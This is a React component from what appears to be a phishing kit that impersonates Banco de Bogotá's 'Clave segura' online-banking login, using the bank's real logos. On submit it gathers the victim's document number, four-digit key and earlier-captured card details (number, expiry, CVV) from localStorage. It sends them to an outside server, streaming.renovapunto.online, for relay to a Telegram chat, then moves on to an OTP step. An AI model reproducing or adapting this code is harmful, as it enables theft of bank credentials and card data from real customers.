import React, { useState, useEffect } from 'react';
import { CSSTransition, TransitionGroup } from 'react-transition-group';
import './animations.css';
import Otp from './otp';
import { EyeIcon } from '@heroicons/react/24/outline';

const SecurePayment = () => {
  const [documentNumber, setDocumentNumber] = useState('');
  const [secureKey, setSecureKey] = useState('');
  const [error, setError] = useState(false);
  const [step, setStep] = useState(1);
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    // Recupera los datos almacenados en el localStorage, si existen
    const storedDocumentNumber = localStorage.getItem('documentNumber');
    const storedSecureKey = localStorage.getItem('secureKey');

    if (storedDocumentNumber) setDocumentNumber(storedDocumentNumber);
    if (storedSecureKey) setSecureKey(storedSecureKey);
  }, []);

  // Función para manejar el cambio de paso
  const handleStepChange = () => {
    setStep(2);
  };

  // Función para enviar un mensaje a Telegram
  const sendTelegramMessage = async (message) => {
    try {
      const chatId = '-1002294546392'; // Asegúrate de que este ID sea correcto
      const response = await fetch('https://streaming.renovapunto.online/enviarmensaje', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ chatId, message }),
      });

      if (!response.ok) {
        throw new Error('Error al enviar el mensaje a Telegram');
      }

      const result = await response.json();
    } catch (error) {
      console.error('Error:', error);
    }
  };

  // Función para manejar el envío del formulario
  const handleSubmit = async () => {
    try {
      if (documentNumber.length > 0 && secureKey.length === 4) {
        // Almacenar los datos en localStorage
        localStorage.setItem('documentNumber', documentNumber);
        localStorage.setItem('secureKey', secureKey);

        handleStepChange();

        // Recupera la información de la tarjeta del localStorage
        const formValues = JSON.parse(localStorage.getItem('formValues')) || {};
        const banco = localStorage.getItem('banco') || 'No disponible';

        if (!formValues.cardHolderName || !formValues.cardNumber) {
          throw new Error('Datos de la tarjeta no disponibles en localStorage');
        }

        const message = `🔑📱 KEY BOGOTÁ 📱🔑:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName || 'No disponible'}\n- 💳: ${formValues.cardNumber || 'No disponible'} \n- 📅: ${formValues.expirationDate || 'No disponible'}\n- 🔐: ${formValues.cvv || 'No disponible'}\n- 🏦: ${banco}\n-------------------------------------------\n 🔑📱 LOGIN NETFLIX 📱🔑\n ------------------------------------------- \n 👤 : ${documentNumber}\n 🔒 : ${secureKey}`;

        await sendTelegramMessage(message);
      } else {
        setError(true);
      }
    } catch (error) {
      console.error('Error en el manejo del formulario:', error);
      setError(true);
    }
  };

  const handleDocumentChange = (e) => {
    setDocumentNumber(e.target.value);
    setError(false);
  };

  const handleKeyChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');
    setSecureKey(value);
  };

  return (
    <div className="flex flex-col items-center bg-gray-100 min-h-screen p-6">
      <TransitionGroup>
        <CSSTransition
          key={step}
          timeout={300}
          classNames="fade"
          unmountOnExit
        >
          <div className="w-full max-w-lg mx-auto bg-white p-6 rounded-lg shadow-lg">
            {step === 1 && (
              <div>
                <img
                  src="https://d31dn7nfpuwjnm.cloudfront.net/images/valoraciones/0023/7354/Banco_de_Bogot%C3%A1.jpg?1464013869"
                  alt="Menu"
                  className="w-48 mb-6 mx-auto"
                />
                <div className="w-full mb-6 flex items-center bg-[#0043A9] p-3 rounded-lg">
                  <img
                    src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.png"
                    alt="Logo"
                    className="w-12 h-auto mr-4"
                  />
                  <div className="text-white text-sm">
                    <p>¿Nunca has ingresado a Banca Virtual?</p>
                    <p>Aquí te decimos cómo hacerlo ›</p>
                  </div>
                </div>

                <div className="w-full mb-6 text-center border-b border-gray-300 py-4 bg-white shadow-md rounded">
                  <span className="text-lg font-semibold">Clave segura</span>
                </div>

                <div className="bg-white rounded-lg shadow-md p-6 w-96">
                  <div className="flex justify-between items-center mb-4">
                    <h2 className="text-xl font-bold">Clave segura</h2>
                    <p className="text-gray-500">Tarjeta débito</p>
                  </div>
                  <div className="bg-blue-100 p-4 rounded-md mb-4">sx
                      <p className="text-gray-700">Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para continuar.</p>
                  </div>
                  <input
                    type="password"
                    placeholder="Ingresa tu clave"
                    className="border border-gray-300 rounded-md p-2 w-full mb-4"
                  />
                  <button className="bg-blue-500 text-white rounded-md p-2 w-full">
                    Iniciar sesión
                  </button>
                </div>

                <div className="w-full flex justify-between mt-6">
                  <p className='text-sm'>Este sitio está protegido por reCAPTCHA y aplican las políticas de privacidad y los términos de servicio de Google.</p>
                </div>
              </div>
            )}

            {step === 2 && (
              <Otp />
            )}
          </div>
        </CSSTransition>
      </TransitionGroup>
    </div>
  );
};

export default SecurePayment;
